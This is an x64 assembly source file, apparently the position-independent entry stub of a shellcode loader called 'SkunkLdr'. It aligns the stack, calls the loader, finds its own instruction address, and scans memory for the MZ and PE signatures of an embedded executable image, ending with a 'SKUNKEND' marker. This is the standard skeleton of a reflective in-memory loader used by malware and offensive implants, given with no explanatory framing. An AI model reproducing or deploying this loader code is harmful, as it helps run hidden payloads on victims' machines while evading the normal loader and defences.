.x64
.model flat, fastcall
option casemap:none
option win64:1

; Import SkunkLdr function
extern SkunkLdr:PROC

; Export procedures
public Start
public RipStart
public RipEnd

_TEXT$A segment

Start:
    push  rsi
    mov   rsi, rsp
    and   rsp, 0FFFFFFFFFFFFFFF0h
    sub   rsp, 020h
    call  SkunkLdr
    mov   rsp, rsi
    pop   rsi
    ret

RipStart:
    call RipPtrStart
    ret

RipPtrStart:
    mov	rax, [rsp]
    sub rax, 01bh
    ret

_TEXT$A ends

_TEXT$C segment

RipEnd:
    call RetPtrEnd
    mov rcx, rax

@L:
    xor rbx, rbx
    mov bx, 05A4Dh
    inc rcx
    cmp bx, word ptr [rcx]
    jne @L

    xor rax, rax
    ;cmp ax, word ptr [rcx + 03ch]
    mov ax, [rcx + 03Ch]

    add rax, rcx

    xor rbx, rbx
    add bx, 04550h
    cmp bx, word ptr [rax]
    jne @L

    mov rax, rcx
    ret

RetPtrEnd:
    mov rax, [rsp]
    ;add rax, 8
    add rax, 036h
    ret

_TEXT$C ends

_TEXT$D segment

SymSkunkEnd:
    db 'S', 'K', 'U', 'N', 'K', 'E', 'N', 'D'

_TEXT$D ends

end
